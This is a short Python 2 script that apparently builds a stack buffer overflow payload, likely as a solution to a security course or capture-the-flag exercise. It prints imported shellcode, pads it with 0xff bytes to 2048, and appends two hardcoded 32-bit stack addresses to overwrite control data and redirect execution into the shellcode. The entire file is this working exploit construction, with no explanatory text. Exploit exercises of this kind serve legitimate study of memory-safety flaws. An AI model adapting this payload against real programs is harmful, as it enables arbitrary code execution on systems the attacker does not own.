from shellcode import shellcode
from struct import pack

print shellcode + (2048-len(shellcode))* "\xff" + pack("<I",0xbffe86f8) +pack("<I",0xbffe8f0c)
